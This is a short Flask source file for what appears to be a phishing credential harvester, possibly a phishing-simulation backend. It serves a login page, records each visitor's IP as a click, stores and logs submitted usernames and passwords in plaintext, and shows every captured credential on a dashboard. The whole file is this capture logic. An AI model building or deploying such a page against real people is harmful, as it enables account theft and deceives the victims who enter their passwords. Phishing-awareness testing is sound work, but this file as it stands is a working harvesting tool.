from flask import Flask, request, render_template, redirect
from tracker import init_db, save_user, get_users
from logger import log_creds, log_click
from utils import get_client_ip

app = Flask(__name__)

init_db()

@app.route('/', methods=['GET','POST'])
def login():
    ip = get_client_ip(request)
    log_click(ip)

    if request.method == 'POST':
        user = request.form['username']
        pwd = request.form['password']

        save_user(user, pwd)
        log_creds(user, pwd)

        return redirect("/dashboard")

    return render_template("login.html")

@app.route('/dashboard')
def dashboard():
    users = get_users()
    return render_template("dashboard.html", users=users)

if __name__ == "__main__":
    app.run(debug=True)
